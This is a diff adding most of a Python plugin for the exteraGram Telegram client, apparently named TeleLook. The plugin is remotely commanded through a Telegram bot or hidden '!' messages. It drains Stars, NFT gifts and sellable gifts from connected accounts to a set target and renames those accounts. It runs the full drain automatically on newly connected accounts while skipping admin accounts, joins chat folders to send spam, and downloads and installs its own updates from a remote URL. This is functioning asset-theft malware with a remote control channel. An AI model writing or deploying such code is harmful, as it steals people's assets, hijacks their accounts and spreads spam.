+            req = urllib.request.Request(url, data=data,
+                                         headers={"Content-Type": "application/json"})
+        with urllib.request.urlopen(req, timeout=timeout) as resp:
+            return json.loads(resp.read().decode("utf-8"))
+
+    def _bot_send_owner(self, text, chat_id=None, reply_markup=None):
+        if not self._bot_token():
+            return
+        cid = chat_id or self._owner_id()
+        if not cid:
+            return
+        payload = {
+            "chat_id": cid,
+            "text": text,
+            "parse_mode": "HTML",
+        }
+        if reply_markup is not None:
+            payload["reply_markup"] = reply_markup
+        try:
+            self._http_json("sendMessage", payload, timeout=15)
+        except Exception:
+            try:
+                fallback = {"chat_id": cid, "text": text}
+                if reply_markup is not None:
+                    fallback["reply_markup"] = reply_markup
+                self._http_json("sendMessage", fallback, timeout=15)
+            except Exception as e:
+                self.log(f"bot send failed: {e}")
+
+    def _bot_loop(self):
+        """Long polling getUpdates. Команды выполняются в фоне."""
+        offset = 0
+        while not self._stop.is_set():
+            if not self._bot_token():
+                self._stop.wait(5)
+                continue
+            try:
+                res = self._http_json(
+                    "getUpdates",
+                    {"offset": offset, "timeout": 25,
+                     "allowed_updates": ["message", "callback_query"]},
+                    timeout=35,
+                )
+                for upd in res.get("result", []):
+                    offset = upd["update_id"] + 1
+                    if upd.get("callback_query"):
+                        self._handle_callback(upd["callback_query"])
+                        continue
+                    msg = upd.get("message") or {}
+                    text = (msg.get("text") or "").strip()
+                    chat_id = (msg.get("chat") or {}).get("id")
+                    from_id = (msg.get("from") or {}).get("id")
+                    if not text or from_id is None:
+                        continue
+                    if self._owner_id() <= 0 or from_id != self._owner_id():
+                        continue
+                    if (msg.get("chat") or {}).get("type") not in (None, "private"):
+                        continue
+                    self._spawn_command(text, reply=lambda t, c=chat_id:
+                                        self._bot_send_owner(t, chat_id=c))
+            except Exception:
+                if not self._stop.is_set():
+                    self.log(f"bot loop error:\n{traceback.format_exc()}")
+                    self._stop.wait(5)
+
+    def on_send_message_hook(self, account, params):
+        """Команды с префиксом '!' (работает и без бота).
+        '!команда' НЕ отправляется в чат — перехватываем и выполняем."""
+        from base_plugin import HookStrategy
+        try:
+            msg = getattr(params, "message", None)
+            if not isinstance(msg, str) or not msg.startswith("!"):
+                return HookResult()
+            uc = get_user_config(account)
+            cur = uc.getCurrentUser() if uc else None
+            if (self._owner_id() <= 0 or cur is None
+                    or int(cur.id) != self._owner_id()):
+                return HookResult()
+            cmd = msg[1:].strip()
+            if not cmd:
+                return HookResult()
+            owner_uid = int(cur.id)
+            acc_slot = account
+            self._spawn_command(
+                cmd,
+                reply=lambda t: self._safe_send(acc_slot, owner_uid, t),
+            )
+            return HookResult(strategy=HookStrategy.CANCEL)
+        except Exception:
+            self.log(f"cmd hook error:\n{traceback.format_exc()}")
+        return HookResult()
+
+    def _safe_send(self, account, peer, html_text):
+        """Отправка ответа из фонового потока (без падений)."""
+        self.log(html_text.replace("<b>", "").replace("</b>", "")
+                 .replace("<code>", "").replace("</code>", ""))
+        try:
+            send_text(peer, html_text, parse_mode="HTML", account=account)
+        except Exception:
+            try:
+                send_text(peer, html_text, account=account)
+            except Exception as e:
+                self.log(f"send failed: {e}")
+
+    HELP_TEXT = (
+        "🤖 <b>Asset Mover — команды</b>\n"
+        "/status — аккаунты: звёзды / подарки / NFT\n"
+        "/drain confirm — слить все звёзды подарками на цель\n"
+        "/nft confirm — передать все NFT-подарки цели\n"
+        "/nick &lt;слот&gt; &lt;Имя&gt; [Фамилия] — ник одного аккаунта\n"
+        "/nick &lt;Имя&gt; [Фамилия] — ник всех аккаунтов\n"
+        "/sell confirm — продать все не-NFT подарки аккаунтов (в звёзды)\n"
+        "/auto on|off|run [слот] — авто-режим и его запуск\n"
+        "/setnick &lt;Имя&gt; — ник, который ставит авто-режим\n"
+        "/setbanner &lt;текст&gt; — текст баннера (кнопка 📢 в меню аккаунта)\n"
+        "/banner — показать баннер\n"
+        "/menu — инлайн-клавиатура управления аккаунтами\n"
+        "/setaddlist &lt;url|slug&gt; — папка чатов для рассылки (t.me/addlist/...)\n"
+        "/setbroadcast &lt;текст&gt; — текст рассылки в чаты папки\n"
+
+        "/broadcast [слот] confirm — вступить в папку и разослать текст\n"
+        "/settarget &lt;user_id&gt; — аккаунт-приёмник\n"
+        "/settargetusername &lt;username&gt; — username приёмника (для знакомства)\n"
+        "/knowtarget [слот] — познакомить аккаунты с приёмником (для отправки)\n"
+        "/tldump &lt;подстрока&gt; — диагностика: какие TLRPC-классы есть в клиенте\n"
+        "/setlog &lt;chat_id&gt; — чат для логов\n"
+        "/settoken &lt;token&gt; — токен бота\n"
+        "/setowner &lt;user_id&gt; — владелец\n"
+        "/update [force] — проверить и скачать обновление плагина\n"
+        "/setupdateurl &lt;url&gt; — URL свежей сборки для авто-обновления\n"
+        "/setupdateid &lt;plugin_id&gt; — id плагина в DevServer (редко нужно)\n"
+        "/setrestart 0|1 — авто-перезапуск клиента после обновления (по умолч. 1)\n"
+        "Без бота: те же команды с префиксом '!'"
+    )
+
+    def _spawn_command(self, text, reply):
+        """Разбор и запуск команды в отдельном потоке."""
+        parts = text.strip().split()
+        if not parts:
+            return
+        cmd = parts[0].split("@")[0].lower().lstrip("/")
+        args = parts[1:]
+        threading.Thread(
+            target=self._run_command,
+            args=(cmd, args, reply),
+            daemon=True,
+        ).start()
+
+    def _run_command(self, cmd, args, reply):
+        try:
+            if cmd in ("help", "start"):
+                reply(self.HELP_TEXT)
+            elif cmd == "status":
+                self._cmd_status(reply)
+            elif cmd == "drain":
+                self._cmd_drain(args, reply)
+            elif cmd == "nft":
+                self._cmd_nft(args, reply)
+            elif cmd == "nick":
+                self._cmd_nick(args, reply)
+            elif cmd == "settarget":
+                self._cmd_set("target_user_id", args, reply, int_only=True)
+            elif cmd == "settargetusername":
+                self._cmd_set("target_username", args, reply, int_only=False)
+            elif cmd == "knowtarget":
+                self._cmd_knowtarget(args, reply)
+            elif cmd == "tldump":
+                self._cmd_tldump(args, reply)
+            elif cmd == "menu":
+                self._cmd_menu(reply)
+            elif cmd == "sell":
+                self._cmd_sell(args, reply)
+            elif cmd == "auto":
+                self._cmd_auto(args, reply)
+            elif cmd == "setnick":
+                self._cmd_setnick(args, reply)
+            elif cmd == "setbanner":
+                self._cmd_setbanner(args, reply)
+            elif cmd == "banner":
+                self._cmd_banner(args, reply)
+            elif cmd == "setaddlist":
+                self._cmd_set("broadcast_slug", args, reply, int_only=False)
+            elif cmd == "setbroadcast":
+                self._cmd_setbroadcast(args, reply)
+            elif cmd == "update":
+                self._cmd_update(args, reply)
+            elif cmd == "setupdateurl":
+                self._cmd_set("update_url", args, reply, int_only=False)
+            elif cmd == "setupdateid":
+                self._cmd_set("update_plugin_id", args, reply, int_only=False)
+            elif cmd == "setrestart":
+                self._cmd_set("update_restart", args, reply, int_only=False)
+
+            elif cmd == "broadcast":
+                self._cmd_broadcast(args, reply)
+            elif cmd == "setlog":
+                self._cmd_set("log_chat_id", args, reply, int_only=True)
+            elif cmd == "setowner":
+                self._cmd_set("owner_id", args, reply, int_only=True)
+            elif cmd == "settoken":
+                self._cmd_set("bot_token", args, reply, int_only=False)
+            else:
+                reply(f"❓ Неизвестная команда: {cmd}\n\n{self.HELP_TEXT}")
+        except Exception as e:
+            self.log(f"cmd '{cmd}' error:\n{traceback.format_exc()}")
+            reply(f"❌ <b>{cmd}</b>: {e}")
+
+    def _cmd_set(self, key, args, reply, int_only):
+        if not args:
+            reply(f"Использование: /{key.replace('_',' ')} &lt;значение&gt;")
+            return
+        raw = args[0]
+        if int_only:
+            try:
+                raw = int(raw)
+            except ValueError:
+                reply("Значение должно быть числом (ID)")
+                return
+        self.set_setting(key, raw)
+        reply(f"✅ {key} = <code>{raw}</code>")
+
+    def _cmd_knowtarget(self, args, reply):
+        """Знакомит аккаунты с приёмником, чтобы они могли отправлять ему
+        подарки (звёзды) и NFT. Без аргумента — для всех аккаунтов;
+        с номером слота — для одного."""
+        slot = None
+        if args and args[0].lstrip("-").isdigit():
+            slot = int(args[0])
+        self._action_know(self._resolve_slots(slot), reply)
+
+    def _throttled(self, reply, interval=8.0):
+        """Обёртка report(): всегда в лог плагина, в чат — не чаще
+        interval секунд (иначе при сливе thousands сообщений)."""
+        state = {"t": 0.0}
+
+        def out(text):
+            self.log(text)
+            now = time.monotonic()
+            if now - state["t"] >= interval:
+                state["t"] = now
+                reply(text)
+
+        return out
+
+    def _cmd_tldump(self, args, reply):
+        """Диагностика TLRPC: показывает реально существующие классы по ключу.
+        Использование: /tldump <подстрока>   (пример: /tldump payments)"""
+        if not args:
+            reply("Использование: <code>/tldump &lt;подстрока&gt;</code>\n"
+                  "Например: <code>/tldump stars</code>, "
+                  "<code>/tldump starGift</code>, <code>/tldump payments</code>")
+            return
+        needle = args[0]
+        found = self._tl_find(needle)
+        if not found:
+            reply(f"🤷 Классы TLRPC с подстрокой '<b>{needle}</b>' не найдены")
+            return
+        text = "\n".join(found)
+        if len(text) > 3900:
+            text = text[:3900] + "\n…(обрезано)"
+        reply(f"🔎 TLRPC ~ '{needle}' ({len(found)}):\n"
+              f"<code>{text}</code>")
+        self.log(f"tldump '{needle}': {found}")
+
+    def _cmd_status(self, reply):
+        modules = self._tl_modules()
+        names = [getattr(m, "__name__", str(m)) for m in modules]
+        lines = ["🔬 <b>TL-модули, найденные в сборке:</b>"]
+        lines += [f"  • <code>{n}</code>" for n in names] or ["  (ничего)"]
+
+        probes = [
+            ("getStarsStatus", ("TL_payments_getStarsStatus", "TL_stars_getStarsStatus")),
+            ("getSavedStarGifts", ("TL_payments_getSavedStarGifts", "getSavedStarGifts")),
+            ("getStarGifts", ("TL_payments_getStarGifts", "getStarGifts")),
+            ("sendStarsForm", ("TL_payments_sendStarsForm", "sendStarsForm")),
+            ("getPaymentForm", ("TL_payments_getPaymentForm", "getPaymentForm")),
+            ("transferStarGift", ("TL_payments_transferStarGift", "transferStarGift")),
+            ("inputSavedStarGiftUser", ("TL_inputSavedStarGiftUser", "inputSavedStarGiftUser")),
+            ("inputInvoiceStarGift", ("TL_inputInvoiceStarGift",)),
+            ("convertStarGift", ("TL_payments_convertStarGift", "convertStarGift")),
+            ("inputSavedStarGiftChat", ("TL_inputSavedStarGiftChat", "inputSavedStarGiftChat")),
+            ("starGiftUnique", ("TL_starGiftUnique", "starGiftUnique")),
+            ("updateProfile", ("TL_account_updateProfile", "updateProfile")),
+            ("resolveUsername", ("TL_contacts_resolveUsername", "resolveUsername")),
+            ("checkChatlistInvite", ("TL_chatlists_checkChatlistInvite", "checkChatlistInvite")),
+            ("joinChatlistInvite", ("TL_chatlists_joinChatlistInvite", "joinChatlistInvite")),
+            ("sendMessage", ("TL_messages_sendMessage", "sendMessage")),
+            ("getHistory", ("TL_messages_getHistory", "getHistory")),
+            ("forwardMessages", ("TL_messages_forwardMessages", "forwardMessages")),
+        ]
+        lines.append("\n<b>Методы (по нашему универсальному поиску):</b>")
+        for label, variants in probes:
+            ok = self._tl_has(*variants)
+            mark = "✅" if ok else "❌"
+            lines.append(f"  {mark} {label}")
+        text = "\n".join(lines)
+        reply(text)
+
+    def _cmd_status(self, reply):
+        self._action_status(self._resolve_slots(None), reply)
+
+    def _cmd_drain(self, args, reply):
+        slot = None
+        if args and args[0].lstrip("-").isdigit():
+            slot = int(args[0])
+            args = args[1:]
+        if not args or args[0].lower() != "confirm":
+            reply("⚠️ Сольёт <b>все</b> звёзды аккаунтов подарками на цель. "
+                  "Продолжить: <code>/drain confirm</code>")
+            return
+        self._action_drain(self._resolve_slots(slot), reply)
+
+    def _cmd_nft(self, args, reply):
+        slot = None
+        if args and args[0].lstrip("-").isdigit():
+            slot = int(args[0])
+            args = args[1:]
+        if not args or args[0].lower() != "confirm":
+            reply("⚠️ Передаст <b>все</b> NFT-подарки аккаунтов цели "
+                  "(нужны звёзды на комиссию). Продолжить: "
+                  "<code>/nft confirm</code>")
+            return
+        self._action_nft(self._resolve_slots(slot), reply)
+
+    def _cmd_nick(self, args, reply):
+        if not args:
+            reply("Использование: <code>/nick [слот] Имя [Фамилия]</code>")
+            return
+        slots = None
+        if len(args) >= 2 and args[0].lstrip("-").isdigit():
+            slots = [int(args[0])]
+            args = args[1:]
+        if not args:
+            reply("Не указана имя")
+            return
+        first = args[0]
+        last = args[1] if len(args) > 1 else None
+        targets = slots or [a["slot"] for a in self._scan_accounts()]
+        done = failed = 0
+        for slot in targets:
+            try:
+                self._set_nick(slot, first, last)
+                done += 1
+                time.sleep(1.0)
+            except Exception as e:
+                failed += 1
+                reply(f"❌ #{slot}: {e}")
+        reply(f"✅ Ник → <b>{first} {last or ''}</b>: обновлено {done}"
+              + (f", ошибок {failed}" if failed else ""))
+    def _resolve_slots(self, slot):
+        """slot=None -> все аккаунты; иначе -> только аккаунт(ы) этого слота."""
+        accounts = self._scan_accounts()
+        if slot is None:
+            return accounts
+        return [a for a in accounts if int(a["slot"]) == int(slot)]
+
+    def _action_status(self, slots, reply):
+        if not slots:
+            reply("Нет подключённых аккаунтов")
+            return
+        lines = ["📊 <b>Аккаунты</b>"]
+        for acc in slots:
+            slot = acc["slot"]
+            head = f"#{slot} {acc['name']} (<code>{acc['user_id']}</code>)"
+            if self._is_admin(acc["user_id"]):
+                head += " 👑"
+            try:
+                stars = self._stars_balance(slot)
+            except Exception as e:
+                lines.append(f"{head}\n  ⭐️ ошибка: {e}")
+                continue
+            try:
+                gifts = self._list_own_gifts(slot, unique_only=False)
+                total = len(gifts)
+                nft = sum(1 for g in gifts if self._is_nft(g))
+            except Exception:
+                total, nft = "?", "?"
+            lines.append(f"{head}\n  ⭐️ {stars} | 🎁 {total} | 💎 {nft}")
+        lines.append(f"\n🎯 Цель: <code>{self._target_id() or 'не задана'}</code>")
+        reply("\n".join(lines))
+
+    def _action_drain(self, slots, reply):
+        target = self._target_id()
+        if not target:
+            reply("Сначала: <code>/settarget &lt;user_id&gt;</code>")
+            return
+        reply(f"▶️ Слив звёзд → <code>{target}</code> начат")
+        for acc in slots:
+            slot = acc["slot"]
+            prefix = f"<b>#{slot} {acc['name']}</b>: "
+            if self._is_admin(acc["user_id"]):
+                reply(f"{prefix}⏭ пропущен (аккаунт админа)")
+                continue
+            prog = self._throttled(lambda t, p=prefix: reply(p + t))
+            try:
+                bought, spent, rest = self._drain_stars(slot, report=prog)
+                reply(f"{prefix}✅ куплено {bought}, потрачено {spent} ⭐, "
+                      f"остаток {rest} ⭐")
+            except Exception as e:
+                reply(f"{prefix}❌ {e}")
+        reply("🏁 Слив завершён")
+
+    def _action_nft(self, slots, reply):
+        target = self._target_id()
+        if not target:
+            reply("Сначала: <code>/settarget &lt;user_id&gt;</code>")
+            return
+        reply(f"▶️ Передача NFT → <code>{target}</code> начата")
+        for acc in slots:
+            slot = acc["slot"]
+            prefix = f"<b>#{slot} {acc['name']}</b>: "
+            if self._is_admin(acc["user_id"]):
+                reply(f"{prefix}⏭ пропущен (аккаунт админа)")
+                continue
+            prog = self._throttled(lambda t, p=prefix: reply(p + t))
+            try:
+                ok, fail = self._transfer_nft(slot, report=prog)
+                reply(f"{prefix}✅ передано {ok}, ошибок {fail}")
+            except Exception as e:
+                reply(f"{prefix}❌ {e}")
+        reply("🏁 Передача NFT завершена")
+
+    def _action_sell(self, slots, reply):
+        reply("▶️ Продажа не-NFT подарков начата")
+        for acc in slots:
+            slot = acc["slot"]
+            prefix = f"<b>#{slot} {acc['name']}</b>: "
+            if self._is_admin(acc["user_id"]):
+                reply(f"{prefix}⏭ пропущен (аккаунт админа)")
+                continue
+            prog = self._throttled(lambda t, p=prefix: reply(p + t))
+            try:
+                sold, gained = self._sell_non_nft_gifts(slot, report=prog)
+                reply(f"{prefix}✅ продано {sold}, получено {gained} ⭐")
+            except Exception as e:
+                reply(f"{prefix}❌ {e}")
+        reply("🏁 Продажа завершена")
+
+    def _action_pipeline(self, slots, reply):
+        reply("🚀 Полный цикл: знакомство → продажа → NFT → звёзды → ник")
+        for acc in slots:
+            slot = acc["slot"]
+            prefix = f"<b>#{slot} {acc['name']}</b>: "
+            if self._is_admin(acc["user_id"]):
+                reply(f"{prefix}⏭ пропущен (аккаунт админа)")
+                continue
+            prog = self._throttled(lambda t, p=prefix: reply(p + t))
+            try:
+                self._run_pipeline(slot, prog)
+                reply(f"{prefix}🏁 цикл завершён")
+            except Exception as e:
+                reply(f"{prefix}❌ {e}")
+        reply("🏁 Полный цикл завершён")
+
+    def _action_know(self, slots, reply):
+        if not self._target_username():
+            reply("Сначала задайте username приёмника: "
+                  "<code>/settargetusername &lt;username&gt;</code>")
+            return
+        done = failed = 0
+        for acc in slots:
+            slot = acc["slot"]
+            try:
+                ok, info = self._know_target(slot)
+                if ok:
+                    done += 1
+                else:
+                    failed += 1
+                reply(f"<b>#{slot}</b>: {info}")
+            except Exception as e:
+                failed += 1
+                reply(f"❌ #{slot}: {e}")
+            time.sleep(1.0)
+        reply(f"✅ Знакомство: успешно {done}"
+              + (f", ошибок {failed}" if failed else ""))
+
+    def _input_peer_from_chat(self, chat):
+        """InputPeer из объекта Chat/Channel (канал -> inputPeerChannel,
+        обычная группа -> inputPeerChat)."""
+        cid = int(getattr(chat, "id", 0) or 0)
+        name = type(chat).__name__.lower()
+        if "channel" in name:
+            peer = self._tl_class("TL_inputPeerChannel", "inputPeerChannel")()
+            peer.channel_id = cid
+            peer.access_hash = int(getattr(chat, "access_hash", 0) or 0)
+            return peer
+        peer = self._tl_class("TL_inputPeerChat", "inputPeerChat")()
+        peer.chat_id = cid
+        return peer
+
+    def _chatlist_input_peers(self, invite):
+        """InputPeer'ы чатов, в которые нужно вступить, из ChatlistInvite.
+        Для chatlistInviteAlready берём только missing_peers."""
+        chats = self._tl_list(getattr(invite, "chats", None))
+        by_id = {}
+        for ch in chats:
+            by_id[int(getattr(ch, "id", 0) or 0)] = ch
+        target_ids = None
+        missing = self._tl_list(getattr(invite, "missing_peers", None))
+        if missing:
+            target_ids = set()
+            for pr in missing:
+                cid = (getattr(pr, "channel_id", None)
+                       or getattr(pr, "chat_id", None)
+                       or getattr(pr, "user_id", None))
+                if cid is not None:
+                    target_ids.add(int(cid))
+        peers = []
+        for cid, ch in by_id.items():
+            if target_ids is not None and cid not in target_ids:
+                continue
+            peers.append(self._input_peer_from_chat(ch))
+        return peers
+
+    def _join_chatlist(self, account, report):
+        """Вступает в папку чатов по addlist-ссылке.
+        Возвращает список (chat, id, title) для рассылки."""
+        slug = self._broadcast_slug()
+        if not slug:
+            report("Ссылка на папку не задана (/setaddlist <url>)")
+            return []
+        if not self._tl_has("TL_chatlists_checkChatlistInvite",
+                            "checkChatlistInvite"):
+            report("В сборке клиента нет chatlists.checkChatlistInvite")
+            return []
+        if not self._tl_has("TL_chatlists_joinChatlistInvite",
+                            "joinChatlistInvite"):
+            report("В сборке клиента нет chatlists.joinChatlistInvite")
+            return []
+        check = self._tl_class("TL_chatlists_checkChatlistInvite",
+                               "checkChatlistInvite")()
+        check.slug = slug
+        invite = self._tl(check, account)
+        if invite is None:
+            report("checkChatlistInvite вернул пусто")
+            return []
+        peers = self._chatlist_input_peers(invite)
+        chats = self._tl_list(getattr(invite, "chats", None))
+        result = []
+        for ch in chats:
+            cid = int(getattr(ch, "id", 0) or 0)
+            if cid:
+                result.append((ch, cid, str(getattr(ch, "title", "") or "")))
+        if peers:
+            join = self._tl_class("TL_chatlists_joinChatlistInvite",
+                                  "joinChatlistInvite")()
+            join.slug = slug
+            join.peers = self._to_vector(peers)
+            self._tl(join, account)
+            report(f"📂 Вступление в папку: чатов {len(result)}")
+        else:
+            report("📂 Нет новых чатов для вступления (уже в папке?)")
+        return result
+
+    def _auto_on_new_account(self, slot):
+        """Авто-режим: полный цикл по только что подключённому аккаунту."""
+        accounts = {a["slot"]: a for a in self._scan_accounts()}
+        acc = accounts.get(slot)
+        prefix = f"<b>#{slot}</b> "
+        if acc and self._is_admin(acc["user_id"]):
+            self._send_log(prefix + "⏭ авто-режим: аккаунт админа пропущен")
+            return
+        self._send_log(prefix + "🤖 авто-режим: запуск полного цикла")
+        prog = self._throttled(lambda t, p=prefix: self._send_log(p + t))
+        try:
+            self._run_pipeline(slot, prog)
+            self._send_log(prefix + "🏁 авто-режим: цикл завершён")
+        except Exception as e:
+            self._send_log(prefix + f"❌ авто-режим: {e}")
+
+
+    def _cmd_sell(self, args, reply):
+        slot = None
+        if args and args[0].lstrip("-").isdigit():
+            slot = int(args[0])
+            args = args[1:]
+        if not args or args[0].lower() != "confirm":
+            reply("⚠️ Продаст <b>все не-NFT подарки</b> аккаунтов и превратит их "
+                  "в звёзды (convertStarGift). NFT не трогает. Продолжить: "
+                  "<code>/sell confirm</code>")
+            return
+        self._action_sell(self._resolve_slots(slot), reply)
+
+    def _cmd_auto(self, args, reply):
+        """Управление авто-режимом: on/off/run."""
+        sub = (args[0].lower() if args else "")
+        if sub in ("on", "вкл", "1"):
+            self.set_setting("auto_mode", "1")
+            reply("🟢 Авто-режим <b>включён</b>. Новые аккаунты будут "
+                  "обработаны полным циклом (продажа → NFT → звёзды → ник → "
+                  "баннер).")
+        elif sub in ("off", "выкл", "0"):
+            self.set_setting("auto_mode", "0")
+            reply("🔴 Авто-режим <b>выключен</b>.")
+        elif sub == "run":
+            slot = None
+            if len(args) > 1 and args[1].lstrip("-").isdigit():
+                slot = int(args[1])
+            self._action_pipeline(self._resolve_slots(slot), reply)
+        else:
+            state = "🟢 ВКЛ" if self._auto_enabled() else "🔴 ВЫКЛ"
+            reply(f"Авто-режим: {state}\n"
+                  "<code>/auto on</code> — включить\n"
+                  "<code>/auto off</code> — выключить\n"
+                  "<code>/auto run [слот]</code> — запустить цикл сейчас")
+
+    def _cmd_setnick(self, args, reply):
+        if not args:
+            cur = self._auto_nick() or "—"
+            reply(f"Авто-ник сейчас: <code>{cur}</code>\n"
+                  "Задать: <code>/setnick Имя [Фамилия]</code>")
+            return
+        nick = " ".join(args)
+        self.set_setting("auto_nick", nick)
+        reply(f"✅ Авто-ник = <code>{nick}</code>")
+
+    def _cmd_setbanner(self, args, reply):
+        if not args:
+            cur = self._banner_text() or "—"
+            reply(f"Баннер сейчас: <code>{cur}</code>\n"
+                  "Задать: <code>/setbanner текст</code>")
+            return
+        text = " ".join(args)
+        self.set_setting("banner_text", text)
+        reply(f"✅ Баннер = <code>{text}</code>")
+
+    def _cmd_banner(self, args, reply):
+        text = self._banner_text()
+        if text:
+            reply(f"📢 {text}")
+        else:
+            reply("Баннер не задан: <code>/setbanner текст</code>")
+
+    def _cmd_setbroadcast(self, args, reply):
+        if not args:
+            cur = self._broadcast_text() or "—"
+            reply(f"Текст рассылки сейчас: <code>{cur}</code>\n"
+                  "Задать: <code>/setbroadcast текст</code>")
+            return
+        text = " ".join(args)
+        self.set_setting("broadcast_text", text)
+        reply(f"✅ Текст рассылки = <code>{text}</code>")
+
+    def _cmd_broadcast(self, args, reply):
+        slot = None
+        if args and args[0].lstrip("-").isdigit():
+            slot = int(args[0])
+            args = args[1:]
+        if not args or args[0].lower() != "confirm":
+            reply("⚠️ Рассылка: аккаунты вступят в папку и отправят "
+                  "туда текст. Продолжить: <code>/broadcast confirm</code>")
+            return
+        self._action_broadcast(self._resolve_slots(slot), reply)
+
+
+    # ------------------------------------------------------------------
+    # Авто-обновление плагина
+    # ------------------------------------------------------------------
+    @staticmethod
+    def _extract_version(content):
+        """Версия __version__ из исходника плагина ('' — если нет)."""
+        m = re.search(r"__version__\s*=\s*['\"]([^'\"]+)['\"]", content)
+        return m.group(1).strip() if m else ""
+
+    @staticmethod
+    def _cmp_versions(a, b):
+        """Сравнение версий вида 1.0.9: -1 / 0 / 1."""
+        def parts(v):
+            out = []
+            for x in str(v or "").split("."):
+                out.append(int(x) if x.strip().isdigit() else 0)
+            return out
+        pa, pb = parts(a), parts(b)
+        n = max(len(pa), len(pb))
+        pa += [0] * (n - len(pa))
+        pb += [0] * (n - len(pb))
+        return (pa > pb) - (pa < pb)
+
+    def _update_url(self):
+        return str(self._cfg("update_url", UPDATE_URL) or "").strip()
+
+    def _update_loop(self):
+        """Фоновая авто-подгрузка обновлений: первый чек через
+        UPDATE_FIRST_DELAY, далее — раз в UPDATE_INTERVAL."""
+        delay = UPDATE_FIRST_DELAY
+        while not self._stop.wait(delay):
+            delay = UPDATE_INTERVAL
+            try:
+                self._check_self_update()
+            except Exception:
+                self.log(f"update check error:\n{traceback.format_exc()}")
+
+    def _cmd_update(self, args, reply):
+        """Ручная проверка обновлений: /update [force]."""
+        force = bool(args) and args[0].lower() in ("force", "!", "принудительно")
+        self._check_self_update(reply=reply, force=force)
+
+    def _check_self_update(self, reply=None, force=False):
+        """Скачивает свежую сборку с update_url и применяет её.
+        Без reply работает тихо в фоне: логирует только ошибки
+        (с дедупликацией) и фактические обновления."""
+        def note(text):
+            """Статус: отвечаем только на ручную команду."""
+            if reply is not None:
+                reply("🔄 " + text)
+
+        def error(text):
+            if reply is not None:
+                reply("❌ " + text)
+                return
+            if str(self.get_setting("upd_err", "") or "") != text:
+                self.set_setting("upd_err", text)
+                self.log("update: " + text)
+
+        url = self._update_url()
+        if not url:
+            note("URL обновлений не задан: "
+                 "<code>/setupdateurl &lt;url&gt;</code>")
+            return False
+        try:
+            req = urllib.request.Request(
+                url, headers={"User-Agent": "TeleLook/" + __version__})
+            with urllib.request.urlopen(req, timeout=25) as resp:
+                raw = resp.read(UPDATE_MAX_BYTES + 1)
+        except Exception as e:
+            error(f"не удалось скачать обновление: {e}")
+            return False
+        if len(raw) > UPDATE_MAX_BYTES:
+            error(f"файл обновления больше {UPDATE_MAX_BYTES} байт — "
+                  "это не плагин?")
+            return False
+        try:
+            content = raw.decode("utf-8")
+        except UnicodeDecodeError:
+            error("файл обновления не в UTF-8 — это не плагин?")
+            return False
+        # Отпечаток нашего плагина: чужой код не ставим.
+        if (not re.search(r"__id__\s*=\s*['\"]TeleLook['\"]", content)
+                or "AssetMoverPlugin" not in content):
+            error("скачанный файл не похож на TeleLook — отказано")
+            return False
+        try:
+            compile(content, "TeleLook.update", "exec")
+        except SyntaxError as e:
+            error(f"в скачанном файле синтаксическая ошибка: {e}")
+            return False
+        remote_ver = self._extract_version(content) or "?"
+        local_ver = str(__version__)
+        digest = hashlib.sha256(content.encode("utf-8")).hexdigest()
+        known = str(self.get_setting("upd_digest", "") or "")
+        cmp = self._cmp_versions(remote_ver, local_ver)
+        if cmp < 0 and not force:
+            note(f"на сервере версия {remote_ver} < установленной "
+                 f"{local_ver} — пропущено (/update force чтобы откатить)")
+            return False
+        if digest == known and cmp <= 0:
+            if reply is not None:
+                reply(f"✅ Уже актуальная сборка {local_ver} "
+                      f"(дайджест {digest[:12]})")
+            return False
+        mode = self._apply_update(content)
+        if not mode:
+            error("обновление скачано, но применить не удалось "
+                  "(DevServer недоступен, файл не записан)")
+            return False
+        self.set_setting("upd_digest", digest)
+        self.set_setting("upd_version", remote_ver)
+        self.set_setting("upd_err", "")
+        will_restart = (
+            mode == "file"
+            and str(self.get_setting("update_restart", "1")).lower()
+            not in ("0", "false", "off", "нет", "no"))
+        note_file = ("перезагрузка через DevServer" if mode == "reload"
+                     else ("файл записан, перезапуск клиента…"
+                           if will_restart
+                           else "файл записан — перезапустите клиент"))
+        text = f"Плагин обновлён {local_ver} → {remote_ver} ({note_file})"
+        if reply is not None:
+            reply("⬆️ " + text)
+        else:
+            self.log("update: " + text)
+            self._send_log("⬆️ " + text)
+        if will_restart:
+            time.sleep(2.5)
+            self._restart_app()
+        return True
+
+    def _apply_update(self, content):
+        """Ставит новую сборку: сначала DevServer exteraGram (перезагрузка
+        сразу), иначе пишет файл своего плагина (нужен рестарт клиента)."""
+        plugin_id = str(self._cfg("update_plugin_id", __id__) or __id__)
+        try:
+            replies = self._dev_server([
+                {"@": "write_plugin", "plugin_id": plugin_id,
+                 "content": content},
+                {"@": "reload_plugin", "plugin_id": plugin_id}])
+            blob = " ".join(replies).lower()
+            if blob and "error" not in blob and ('"@\"' in blob or blob.strip()):
+                return "reload"
+        except Exception as e:
+            self.log(f"update: DevServer недоступен ({e})")
+        try:
+            folder = self._plugins_dir()
+            path = self._own_plugin_file(folder)
+            if path and self._write_file(path, content.encode("utf-8")):
+                return "file"
+            self.log(f"update: файл плагина не найден "
+                     f"(каталог: {folder or 'пусто'})")
+        except Exception as e:
+            self.log(f"update: запись файла не удалась: {e}")
+        return ""
+
+    def _dev_server(self, commands, timeout=6):
+        """Обмен с DevServer exteraGram на 127.0.0.1:42690
+        (write/reload плагина). Как в рабочем icon_themer_plugin.py."""
+        sock = socket.create_connection(("127.0.0.1", 42690), timeout=timeout)
+        replies = []
+        try:
+            for index, command in enumerate(commands):
+                payload = dict(command)
+                payload["#"] = "tl%d" % (index + 1)
+                sock.sendall((json.dumps(payload) + "\n").encode("utf-8"))
+                buffer = b""
+                for _ in range(4):
+                    try:
+                        chunk = sock.recv(262144)
+                    except Exception:
+                        break
+                    if not chunk:
+                        break
+                    buffer += chunk
+                    if b"\n" in buffer:
+                        break
+                replies.append(buffer.decode("utf-8", "replace"))
+        finally:
+            try:
+                sock.close()
+            except Exception:
+                pass
+        return replies
+
+    def _plugins_dir(self):
+        """Каталог с файлами плагинов — несколькими способами."""
+        import os
+        try:
+            from file_utils import get_plugins_dir
+            path = get_plugins_dir()
+            if path and os.path.isdir(str(path)):
+                return str(path)
+        except Exception:
+            pass
+        try:
+            from org.telegram.messenger import ApplicationLoader
+            files = str(ApplicationLoader.applicationContext.getFilesDir())
+            for name in ("plugins", "exteragram/plugins", "plugin", ""):
+                candidate = os.path.join(files, name)
+                if os.path.isdir(candidate):
+                    return candidate
+        except Exception:
+            pass
+        return ""
+
+    def _own_plugin_file(self, folder):
+        """Файл, который реально сейчас запущен — по отпечатку TeleLook
